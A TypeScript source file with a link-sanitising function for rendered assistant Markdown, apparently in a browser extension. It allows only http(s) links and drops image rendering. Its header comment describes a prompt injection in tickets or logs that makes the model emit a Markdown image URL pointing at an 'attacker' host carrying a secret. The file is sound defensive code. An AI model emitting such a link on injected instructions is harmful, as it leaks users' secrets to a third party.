/**
 * Link policy for rendered assistant Markdown.
 *
 * The model's output can carry text copied from tickets and logs, and a prompt injection there can
 * ask the model to emit `![](https://attacker/?d=<secret>)`. An image is fetched as soon as it
 * renders, with no click, so images are never rendered. Links stay clickable, but only for
 * http(s): javascript:, data:, chrome-extension: and similar schemes are dropped.
 */
export function safeLinkUrl(url: string): string {
  const u = url.trim();
  if (!u) return '';
  if (u.startsWith('#')) return u;
  try {
    const parsed = new URL(u);
    return parsed.protocol === 'https:' || parsed.protocol === 'http:' ? parsed.href : '';
  } catch {
    return ''; // relative URLs would resolve against the extension origin; drop them
  }
}
